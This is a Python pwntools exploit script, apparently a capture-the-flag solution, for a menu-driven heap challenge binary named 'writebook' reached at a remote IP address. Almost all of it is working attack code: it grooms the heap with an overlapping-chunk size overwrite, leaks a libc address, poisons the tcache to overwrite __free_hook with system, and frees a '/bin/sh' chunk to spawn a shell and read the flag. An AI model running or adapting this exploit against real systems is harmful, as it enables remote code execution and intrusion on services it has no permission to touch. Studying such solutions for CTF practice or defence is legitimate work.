# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './writebook'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '192.168.36.204'
    port = '2002'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size ,type = 2 ):
    cmd(1)
    sla('sides?\n>' , type)
    sla('size:' , size)

def edit(idx , content):
    cmd(2)
    sla('Page' , idx)
    sa('Content',content)

def show(idx):
    cmd(3)
    sla('Page' , idx)

def delete(idx):
    cmd(4)
    sla('Page' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    for i in range(10):
        add(0xf0 ,1)
    add(0x128)
    add(0xf0 , 1)
    add(0xf0 , 1)

    edit(10,'a'*0x120 + p64(0x430))
    for i in range(8):
        delete(i)
    delete(11)
    add(0xd8 , 1)
    show(0)

    __malloc_hook = l64() - 1056 - 0x10 - 0x70
    lg('__malloc_hook' , __malloc_hook)
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    delete(10)
    add(0x148)
    add(0x148)

    edit(2 , 'a'*0xc8 + flat(0x131 , __free_hook -8) + '\n')
    add(0x128)
    add(0x128)

    edit(4 , flat('/bin/sh\x00' , system_addr)+ '\n')
    delete(4)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   writebook.py
@Time    :   2021/11/13 12:36:47
@Author  :   Niyah 
'''